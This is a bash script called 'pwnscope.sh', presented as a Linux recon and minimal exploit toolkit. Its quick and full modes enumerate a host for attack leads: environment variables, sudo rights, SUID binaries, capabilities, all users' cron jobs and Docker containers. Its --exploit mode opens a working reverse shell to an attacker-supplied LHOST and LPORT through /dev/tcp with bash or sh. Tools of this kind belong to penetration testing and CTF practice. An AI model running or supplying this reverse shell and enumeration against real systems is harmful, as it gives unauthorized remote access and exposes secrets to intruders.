#!/bin/bash

# =======================================================
# ___________      ________________________________________ 
# ___  __ \_ | /| / /_  __ \_  ___/  ___/  __ \__  __ \  _ \
# __  /_/ /_ |/ |/ /_  / / /(__  )/ /__ / /_/ /_  /_/ /  __/
# _  .___/____/|__/ /_/ /_//____/ \___/ \____/_  .___/\___/ 
# /_/          
#            
# pwnscope.sh - Linux Recon & Minimal Exploit Toolkit
# Author: suuhm
# License: MIT
# Date: 2025
# =======================================================

show_usage() {
  cat << EOF
Usage: $0 [--short | --full | --exploit]

Options:
  --short    Quick system info and key checks
  --full     Extensive enumeration (takes longer)
  --exploit  Minimal reverse shell (requires LHOST and LPORT env variables)

Examples:
  $0 --short
  $0 --full
  LHOST=10.10.10.4 LPORT=4444 $0 --exploit
EOF
  exit 1
}

quick_checks() {
  echo "[*] Quick System Overview"
  echo "Hostname: $(hostname)"
  echo "User: $(whoami)"
  echo "Kernel: $(uname -r)"
  echo "Uptime: $(uptime -p)"
  echo "CPU Info: $(lscpu | grep 'Model name' | head -n1 | cut -d ':' -f2 | xargs)"
  echo "Memory Usage:"
  free -h | head -n2
  echo "Disk Usage (root):"
  df -h / | tail -1
  echo "Top 5 processes by memory:"
  ps aux --sort=-%mem | head -n6
  echo "Open ports:"
  ss -tuln | head -n10
}

full_checks() {
  echo "[*] Full System Enumeration"
  quick_checks
  echo "=== Environment Variables ==="
  env
  echo "=== Current User Sudo Privileges ==="
  sudo -l 2>/dev/null || echo "No sudo or not allowed."
  echo "=== SUID files (top 10) ==="
  find / -perm -4000 -type f 2>/dev/null | head -n10
  echo "=== Capabilities ==="
  getcap -r / 2>/dev/null
  echo "=== Network Interfaces and Routes ==="
  ip a
  ip r
  echo "=== Scheduled Cron Jobs ==="
  for user in $(cut -f1 -d: /etc/passwd); do
    echo "Cron jobs for $user:"
    crontab -u $user -l 2>/dev/null
  done
  echo "=== Docker / Container Check ==="
  if command -v docker >/dev/null 2>&1; then
    docker ps -a
  else
    echo "Docker not installed."
  fi
}

minimal_reverse_shell() {
  if [[ -z "$LHOST" || -z "$LPORT" ]]; then
    echo "[!] Please set LHOST and LPORT environment variables."
    exit 1
  fi
  echo "[*] Attempting minimal reverse shell to $LHOST:$LPORT"

  # Try bash
  if command -v bash >/dev/null 2>&1; then
    bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
    exit
  fi

  # Try sh
  if command -v sh >/dev/null 2>&1; then
    sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1
    exit
  fi

  echo "[!] No suitable shell found for reverse shell."
  exit 1
}

# Main
if [[ $# -eq 0 ]]; then
  show_usage
fi

case $1 in
  --short)
    quick_checks
    ;;
  --full)
    full_checks
    ;;
  --exploit)
    minimal_reverse_shell
    ;;
  *)
    show_usage
    ;;
esac

exit 0
